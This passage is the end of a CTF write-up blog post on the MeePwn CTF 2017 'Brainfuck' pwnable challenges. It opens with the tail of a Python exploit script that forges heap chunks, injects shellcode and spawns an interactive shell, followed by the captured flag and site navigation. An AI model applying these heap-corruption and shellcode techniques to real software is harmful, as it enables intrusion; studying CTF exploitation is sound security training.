class="number">0x111</span>) )</span><br><span class="line">    special = <span class="string">"&lt;"</span>*<span class="number">0xd0</span> + <span class="string">",&gt;"</span>*<span class="number">8</span></span><br><span class="line">    <span class="comment"># fake next size</span></span><br><span class="line">    write(<span class="number">0x98</span>, p64(<span class="number">0x71</span>),special, p64(fake_chunk))</span><br><span class="line">    <span class="comment"># create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)</span></span><br><span class="line">    cmd(<span class="string">",[&gt;.,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,[&gt;.,]"</span>)</span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">0x108</span> + <span class="string">"\xa1\x01\x02\x00"</span> <span class="comment"># fake next size</span></span><br><span class="line">    payload += <span class="string">"i"</span>*<span class="number">0x190</span></span><br><span class="line">    payload += <span class="string">"\x90"</span>*<span class="number">0x10</span> + sc + <span class="string">"\x00"</span></span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="comment"># overwrite bf_data, make bf_data-&gt;sc_buf point to our shellcode buffer</span></span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">0x40</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(sc_buf) + p64(<span class="number">0x100</span>) + p64(<span class="number">100</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>flag: <code>MeePwnCTF{My_M33pwn_h34p_1s_fun?}</code></p>
+<p>Got both first blood on these challenges ! WOOHOO ! 😎🤘</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/heap/" rel="tag"># heap</a>
+          
+            <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+          
+            <a href="/tags/MeePwn/" rel="tag"># MeePwn</a>
+          
+            <a href="/tags/brainfuck/" rel="tag"># brainfuck</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/16/MeePwn-CTF-2017-anotherarena/" rel="next" title="MeePwn CTF 2017 -- anotherarena">
+                <i class="fa fa-chevron-left"></i> MeePwn CTF 2017 -- anotherarena
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/20/hxp-CTF-2017-hardened-flag-store/" rel="prev" title="hxp CTF 2017 -- hardened_flag_store">
+                hxp CTF 2017 -- hardened_flag_store <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Brainfuck1"><span class="nav-number">1.</span> <span class="nav-text">Brainfuck1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brainfuck2"><span class="nav-number">2.</span> <span class="nav-text">Brainfuck2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/';
+          this.page.identifier = '2017/07/16/MeePwn-CTF-2017-Brainfuck-1-2/';
+          this.page.title = 'MeePwn CTF 2017 -- Brainfuck 1 & 2';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
